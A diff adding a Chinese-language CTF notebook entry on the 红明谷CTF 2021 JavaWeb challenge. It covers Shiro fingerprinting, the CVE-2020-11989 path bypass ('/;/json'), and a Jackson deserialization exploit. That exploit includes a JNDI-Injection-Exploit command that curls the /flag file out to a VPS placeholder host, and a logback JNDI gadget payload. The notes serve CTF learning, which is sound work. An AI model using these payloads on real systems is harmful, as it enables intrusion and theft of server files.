@@ -1288,3 +1288,9 @@ pool.join()
 - AES ECB加密内容识别：修改密文的开头几个字节不影响末尾密文的解密（反之也成立，修改密文末尾的字节不影响开头明文的解密）。与CBC模式不同，CBC中修改前段密文解密出来的明文全部都会是乱码。
 - ECB加密是16位一组，每组相互独立，加密后每组为32位。
 - 在json中1.00 == 1（小数点后几个0都没问题）。
+193. [[红明谷CTF 2021]JavaWeb](https://blog.csdn.net/Mrs_H/article/details/124035038)
+- Apache [shiro](https://zhuanlan.zhihu.com/p/54176956)框架[判断](https://blog.csdn.net/qq_38154820/article/details/106726691)：可在 cookie 追加一个`rememberMe=xx`的字段，这个字段是rememberMeManager默认的。然后看响应头部可以看看是否有`Set-Cookie:rememberMe=deleteMe; `的字段。若有则是shiro框架。
+- CVE-2020-11989,[Apache Shiro权限绕过](https://www.anquanke.com/post/id/222489)：当遇到无法访问的url（直接访问会重定向），可以考虑（假设要访问的url为/json）：
+    - /;/json
+    - url二次编码
+- [jackson反序列化漏洞](https://b1ue.cn/archives/189.html)利用[工具](https://github.com/welk1n/JNDI-Injection-Exploit/releases/tag/v1.0)命令:`java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C 'curl [VPS_IP:PORT] -File=@/flag' -A "[VPS_IP]"`。命令成功执行后复制工具给出的符合要求的rmi地址，使用CVE-2019-14439(springboot)的链子：`["ch.qos.logback.core.db.JNDIConnectionSource",{"jndiLocation": "rmi://地址"}]`。需要公网ip。
